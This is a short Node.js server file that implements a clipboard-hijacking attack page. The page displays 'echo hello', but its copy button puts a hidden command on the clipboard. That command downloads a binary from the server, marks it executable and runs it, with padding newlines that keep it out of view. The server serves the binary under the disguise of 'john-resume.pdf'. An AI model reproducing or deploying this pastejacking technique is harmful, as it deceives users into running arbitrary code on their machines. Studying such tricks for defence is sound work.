const fs = require("fs");
const url = require('url');

const http = require("http").Server((req, res) => {
    if (url.parse(req.url)["pathname"] == "/d") {
        const rs = fs.createReadStream("./files/a.out");
        res.setHeader("Content-Disposition", "attachment; john-resume.pdf")
        rs.pipe(res);
    } else {
        res.end('<!DOCTYPE html><html lang="en"><head><style>.noselect {-webkit-touch-callout: none;-webkit-user-select: none;-khtml-user-select: none;-moz-user-select: none;-ms-user-select: none;user-select: none;}</style><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>L bozo</title></head><body><script>function copy() {navigator.clipboard.writeText("curl http://localhost:1337/d --output ./a.out && chmod +x ./a.out && ./a.out\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n echo hello")}</script><div class="noselect">This command is cool: echo hello</div><button onClick="copy()">copy</button></body></html>')
    }
})

http.listen(1337, () => {
    console.log("server is running");
});
